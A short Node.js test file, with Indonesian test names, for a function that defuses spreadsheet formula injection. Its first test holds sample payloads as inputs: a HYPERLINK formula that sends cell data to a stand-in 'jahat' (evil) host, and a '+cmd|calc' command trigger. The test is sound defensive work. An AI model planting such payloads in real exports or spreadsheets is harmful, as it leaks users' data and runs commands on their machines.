'use strict';

const { test } = require('node:test');
const assert = require('node:assert/strict');
const { neutralizeFormula } = require('../src/formula-guard');

test('teks berawalan formula diberi apostrof', () => {
  assert.equal(neutralizeFormula('=HYPERLINK("https://jahat/?"&A2,"Klik")'), `'=HYPERLINK("https://jahat/?"&A2,"Klik")`);
  assert.equal(neutralizeFormula('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(neutralizeFormula('+cmd|calc'), "'+cmd|calc");
  assert.equal(neutralizeFormula('-1+1'), "'-1+1");
  assert.equal(neutralizeFormula('\t=1'), "'\t=1");
});

test('teks biasa, nomor HP, dan angka tidak disentuh', () => {
  assert.equal(neutralizeFormula('Halo kak, mau tanya'), 'Halo kak, mau tanya');
  assert.equal(neutralizeFormula('+62 812-3456-7890'), '+62 812-3456-7890');
  assert.equal(neutralizeFormula('-5'), '-5');
  assert.equal(neutralizeFormula(''), '');
  assert.equal(neutralizeFormula(42), 42);
});
